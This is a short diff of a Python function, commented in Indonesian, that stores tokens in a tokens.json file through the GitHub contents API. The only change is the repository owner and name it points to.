@@ -21,8 +21,8 @@ def generate_github_signature(token):
 # Fungsi untuk menyimpan token ke GitHub
 def save_to_github(token):
     GITHUB_TOKEN = os.getenv("TOKEN_GITHUB")
-    REPO_OWNER = "AllJrLwr"
-    REPO_NAME = "AllJrLwr"
+    REPO_OWNER = "PongoJR"
+    REPO_NAME = "AnjayMabar"
     FILE_PATH = "tokens.json"
 
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
